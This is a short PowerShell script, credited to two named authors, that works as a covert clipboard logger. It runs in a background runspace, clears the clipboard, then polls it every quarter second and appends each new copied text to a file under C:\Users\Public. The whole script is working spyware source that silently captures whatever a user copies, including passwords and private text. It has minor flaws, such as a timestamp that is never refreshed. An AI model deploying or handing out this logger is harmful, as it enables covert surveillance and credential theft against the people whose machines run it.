######################################################################################
# PowerShell Clip Logger:                                                                         
# Joshua "MrSchism" Embrey [mrschism@sdf.org]                                        
# Joseph "Arcarna" Preston [jpreston86@gmail.com]                                        
# Intial commit: January 22, 2014                                                         
# Current version: January 22, 2014                                                        
######################################################################################

$runspace = [runspacefactory]::CreateRunspace()
$runspace.Open()
$world = [powershell]::Create()
$world.Runspace = $runspace
$world.Addscript({

# Declare clipboard function	
function Get-Clipboard([switch] $Lines) {
	if($Lines) {
		$cmd = {
			Add-Type -Assembly PresentationCore
			[Windows.Clipboard]::GetText() -replace "`r", '' -split "`n"
		}
	} 
    else {
		$cmd = {
			Add-Type -Assembly PresentationCore
			[Windows.Clipboard]::GetText()
		}
	}
	if([threading.thread]::CurrentThread.GetApartmentState() -eq 'MTA') {
		& powershell -Sta -Command $cmd
	} else {
		& $cmd
	}
}

# variables!
$oldclip = ""
$clip = ""
$datadir = "C:\Users\Public\ps.slog"
$zed = 1
$time = get-date

write-host | clip

# Create file
if (-not(test-path $datadir)) {
	ni $datadir -type file
    }

while ($zed = 1) {
	$clip = get-clipboard
		if ($clip -ne "") { 
			if ($clip -ne $oldclip) { 
				ac $datadir ("`n <<< FROM CLIPBOARD $time >>> `n`n" + $clip + "`n <<< END CLIP >>> `n`n")
                $oldclip = $clip
                }
            }
        sleep .25
}
                
}) 
$world.BeginInvoke()
